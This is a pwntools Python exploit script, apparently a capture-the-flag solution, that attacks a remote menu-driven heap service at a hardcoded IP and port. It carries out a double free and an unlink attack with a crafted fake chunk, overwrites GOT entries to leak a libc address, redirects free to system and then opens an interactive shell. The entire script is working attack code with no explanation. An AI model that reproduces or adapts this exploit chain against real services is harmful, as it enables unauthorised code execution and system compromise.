#!/usr/bin/env python
from pwn import *

r = remote('52.68.31.117', 9547)
def add(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('1')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

def de(t):
    r.recvuntil('3. Renew secret\n')
    r.sendline('2')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))

def update(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('3')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

add(1, 'a')
add(2, 'a')
de(1)
add(3, 'a')
de(1)

f_ptr = 0x6020d0
fake_chunk = p64(0) + p64(0x21)
fake_chunk += p64(f_ptr - 0x18) + p64(f_ptr-0x10)
fake_chunk += '\x20'
add(1, fake_chunk)
de(2)

atoi_GOT = 0x602080
free_GOT = 0x602018
puts_GOT = 0x602020
puts_plt = 0x400760
atoi_offset = 0x36e70
system_offset = 0x45380

f = p64(0)
f += p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT)
f += p32(1)*3
update(1, f)
update(1, p64(puts_plt))
de(2)
s = r.recv(6)
libc_base = u64(s.ljust(8, '\x00')) - atoi_offset
system = libc_base + system_offset
update(1, p64(system))
add(2, 'sh\0')
de(2)


r.interactive()


